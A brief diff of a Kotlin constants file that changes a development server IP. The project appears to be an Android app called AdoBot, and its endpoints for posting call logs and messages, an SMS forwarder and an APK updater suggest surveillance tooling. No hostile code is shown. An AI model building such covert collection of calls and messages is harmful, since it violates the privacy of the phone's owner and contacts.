@@ -8,7 +8,7 @@ object Constants {
     val UPDATE_PKG_FILE_NAME = "update.apk"
     val SMS_FORWARDER_SIGNATURE = "AdoBot SMS Forwarder"
     val PREF_SERVER_URL_FIELD = "serverUrl"
-    val DEVELOPMENT_SERVER = "http://10.24.0.134:3000"
+    val DEVELOPMENT_SERVER = "http://172.30.10.115:3000"
     val NOTIFY_URL = "/notify"
     val POST_CALL_LOGS_URL = "/call-logs"
     val POST_MESSAGE_URL = "/message"
